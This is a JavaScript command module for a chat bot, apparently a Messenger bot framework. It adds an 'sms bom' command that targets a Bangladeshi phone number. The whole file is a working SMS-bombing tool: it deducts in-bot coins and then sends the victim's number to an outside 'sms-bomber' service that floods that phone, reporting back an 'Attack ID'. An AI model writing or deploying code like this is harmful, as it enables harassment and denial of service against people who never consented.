const axios = require("axios");
const deltaNext = 5;

function expToLevel(exp) {
  return Math.floor((1 + Math.sqrt(1 + 8 * exp / deltaNext)) / 2);
}

module.exports = {
  config: {
    name: "sms",
    version: "1.1.1",
    author: "MR_FARHAN",
    countDown: 15,
    role: 0,
    shortDescription: { en: "API call (BD)" },
    category: "tools",
    guide: { en: "sms bom 01xxxxxxxxx" }
  },

  onStart: async function ({ event, message, args, usersData }) {
    const sub = args[0];
    const number = args[1];

    if (sub !== "bom") {
      return message.reply("Usage:\n)sms bom 01xxxxxxxxx");
    }

    if (!number || !/^01[0-9]{9}$/.test(number)) {
      return message.reply("📵 BD নাম্বার দিন\nউদাহরণ: )sms bom 01xxxxxxxxx");
    }

    const senderID = event.senderID;

    const userData = await usersData.get(senderID);
    const exp = userData?.exp || 0;
    const balance = userData?.money || 0;
    const level = expToLevel(exp);

    if (level < 2) {
      return message.reply("🚫 এই কমান্ড ব্যবহার করতে tk লাগবে");
    }

    if (balance < 100) {
      return message.reply(`❌ Not enough coins\n💵 you have: ${balance}\n📝 দরকার: 100`);
    }

    await usersData.set(senderID, { money: balance - 100 });

    await message.reply(`📡 Sending request...\n📩 Target: ${number}`);

    try {
      const url = `https://shadowx-sms-bomber.onrender.com/smsb?num=${number}`;
      const res = await axios.get(url, { timeout: 15000 });
      const data = res.data;

      if (!data || data.success !== true) {
        return message.reply("❌ API response unsuccessful");
      }

      return message.reply(
        `✅ Request accepted\n` +
        `🆔 Attack ID: ${data.attack_id || "N/A"}\n` +
        `ℹ️ Message: ${data.message || "No message"}`
      );

    } catch (e) {
      return message.reply("❌ API unreachable / blocked");
    }
  }
};
